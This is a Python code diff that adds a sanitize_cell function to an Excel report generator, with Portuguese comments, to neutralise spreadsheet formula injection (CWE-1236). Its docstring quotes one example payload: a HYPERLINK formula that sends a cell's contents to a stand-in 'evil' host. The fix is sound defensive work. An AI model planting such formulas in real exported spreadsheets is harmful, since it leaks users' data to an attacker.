@@ -19,6 +19,23 @@ except ImportError:
     HAS_REPORTLAB = False
 
 
+#: Prefixos que fazem Excel/LibreOffice/Sheets interpretar a célula como fórmula.
+_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def sanitize_cell(value: Any) -> Any:
+    """Neutraliza CSV/Excel Formula Injection (CWE-1236).
+
+    Nomes de usuário entram no relatório como texto livre. Um nome como
+    `=HYPERLINK("http://evil/?d="&A1,"clique")` viraria fórmula ativa ao abrir a
+    planilha exportada. Prefixar com apóstrofo força o Excel a tratar como texto,
+    sem alterar o que o leitor humano vê.
+    """
+    if isinstance(value, str) and value.startswith(_FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
+
 def generate_excel_report(data: List[Dict[str, Any]], report_type: str) -> bytes:
     if not HAS_OPENPYXL:
         raise ImportError("openpyxl não está instalado")
@@ -34,7 +51,7 @@ def generate_excel_report(data: List[Dict[str, Any]], report_type: str) -> bytes
     header_alignment = Alignment(horizontal="center", vertical="center")
     
     for col_num, header in enumerate(headers, 1):
-        cell = ws.cell(row=1, column=col_num, value=header)
+        cell = ws.cell(row=1, column=col_num, value=sanitize_cell(header))
         cell.font = header_font
         cell.fill = header_fill
         cell.alignment = header_alignment
@@ -42,7 +59,7 @@ def generate_excel_report(data: List[Dict[str, Any]], report_type: str) -> bytes
     for row_num, row_data in enumerate(data, 2):
         for col_num, header in enumerate(headers, 1):
             value = row_data.get(header, "")
-            ws.cell(row=row_num, column=col_num, value=value)
+            ws.cell(row=row_num, column=col_num, value=sanitize_cell(value))
     
     for col in ws.columns:
         max_length = 0
